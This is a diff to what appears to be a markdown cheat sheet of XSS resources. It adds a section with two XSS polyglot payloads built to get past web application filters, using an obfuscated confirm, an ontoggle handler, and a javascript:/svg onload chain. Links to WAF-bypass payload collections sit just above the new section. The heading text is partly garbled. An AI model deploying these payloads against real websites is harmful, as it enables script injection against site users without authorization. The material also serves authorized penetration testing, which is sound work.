@@ -246,5 +246,10 @@ https://github.com/Walidhossain010/WAF-bypass-xss-payloads
 https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057
 ```
 
-   
+### 7.XSS PolyglotsPolice: revolving allow you to test multiple XSS scenarios with ONE payload.  Work smarter not harder:
+![xss](https://user-images.githubusercontent.com/63053441/148800150-58f87374-41ad-4ea8-8887-510c652c7452.jpg)
+```js
+-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
 
